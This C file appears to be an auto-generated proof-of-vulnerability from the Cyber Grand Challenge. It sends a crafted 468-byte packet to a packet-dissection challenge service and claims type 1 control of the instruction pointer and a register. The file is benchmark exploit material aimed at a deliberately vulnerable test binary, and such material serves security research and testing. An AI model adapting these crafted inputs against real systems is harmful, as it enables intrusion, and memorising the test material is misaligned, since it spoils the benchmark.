#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd4\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbc\x01\x00\x00\xb4\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb4\x01\x00\x00"
         "\x57\x39\xfa\x9d\xf8\x55\x2f\x43\xaf\xf2\xa1\xd4\x4a\x5c\xbd\x55"
         "\xe2\xc3\xf4\x5b\x51\x00\x00\x00\x01\x00\x1f\x01\xc3\x01\x95\x41"
         "\x00\x7c\x8e\x9d\xc4\xe5\x69\x8c\x66\x2d\x11\xfe\x92\x59\xa3\xd2"
         "\x1b\xe8\x01\x00\xb7\x3a\x23\xa1\xca\xe3\xe4\xb0\x39\xa3\x26\x43"
         "\x15\x36\x3a\xa6\xc2\x9e\xfc\x8e\x29\x01\x00\x17\x96\x6a\x14\xf3"
         "\xcb\x8b\x8c\xa8\xff\xe0\x4b\xdb\xa2\x89\x20\xe9\xd5\xc7\xf1\x77"
         "\xa2\x51\x32\x91\x2e\x98\xe4\xb0\x8e\xea\xaf\x0c\x5b\x22\x97\xb4"
         "\x93\xc3\x90\x94\x63\x16\x78\x8b\x08\xe8\x23\x47\x8a\x88\x03\x44"
         "\x44\x2b\xd2\x33\x50\x15\x4c\xb2\xf5\x23\x94\x49\xcc\x16\x5f\xeb"
         "\x33\x21\x34\x44\xa6\x6d\x34\x4b\x98\xb0\xe7\x4d\x71\xf9\xe5\x96"
         "\x7d\x2a\x14\x07\xa2\x37\xa3\x8f\x3f\xff\x64\xd7\x70\x8a\xeb\xfa"
         "\xf8\x3a\xea\xb0\x17\x98\xb1\x5d\xf1\x10\xa1\xcd\x56\x0f\x3a\x73"
         "\x72\x8a\x44\x59\x99\x5b\x18\x65\x22\xac\xb5\xdf\x1b\x25\x79\x9a"
         "\x67\xd7\xf8\x84\x5e\x3f\xe2\x68\x18\x5e\xad\xe1\x76\xd7\x3f\xb8"
         "\x28\x8f\xe1\x2a\xd9\x34\x77\x56\x5c\x4c\xb7\x92\x6b\x60\x8c\xb7"
         "\xf6\xf8\x43\x1c\xc9\xc1\x66\x99\x16\x05\xbf\x0d\xc8\x3f\x46\xf4"
         "\x00\xfe\xfa\x75\xaf\xda\xc3\x04\xae\x21\x95\xf8\x03\xc1\x35\x30"
         "\x0e\x8a\x57\x5d\x3b\x6b\x66\xd1\x04\x77\x72\x42\xa6\x7a\x56\x73"
         "\xa7\x0c\x2a\xd9\x69\x08\x5d\xe6\xd2\x19\x41\xd1\x30\xed\x6b\x42"
         "\xe0\xfb\x0d\x4d\x3c\x11\x4e\x53\x49\x1f\x0d\xb0\x2f\xb3\x7c\x93"
         "\xab\x68\x3b\x22\xda\xc1\x01\xf9\x51\x1a\x91\xfa\x16\x4a\x67\xe4"
         "\x30\xfb\x05\x66\xbd\x2b\xa7\x49\x01\x00\x8a\x3f\xd4\x9b\x2d\xd5"
         "\x9b\x9f\x5a\x01\x00\x8e\xb6\x07\xbf\xd0\x08\x0c\x01\xec\x7e\xb8"
         "\x6c\xbd\x38\xdd\x01\x00\xb6\x2e\x61\xfa\x48\x01\x00\x5f\x11\x0a"
         "\xf3\x98\x01\x00\x68\x20\x5a\x64\x5d\x3f\xe6\xc1\xff\x91\xc9\xbf"
         "\x41\x00\x01\x00\x81\x01\x88\x64\x8c\x01\x00\x5e\x8a\x16\xb9\x5c"
         "\x2c\x52\x98\x41\x62\xb3\x5e\x6b\xa0\x8a\x0a\xa8\x79\x3a\x01\x4b"
         "\x91\xf9\x41\x00";
      static unsigned int write_00001_00000_len = 468;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasmolt
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x6d\x6f\x6c\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
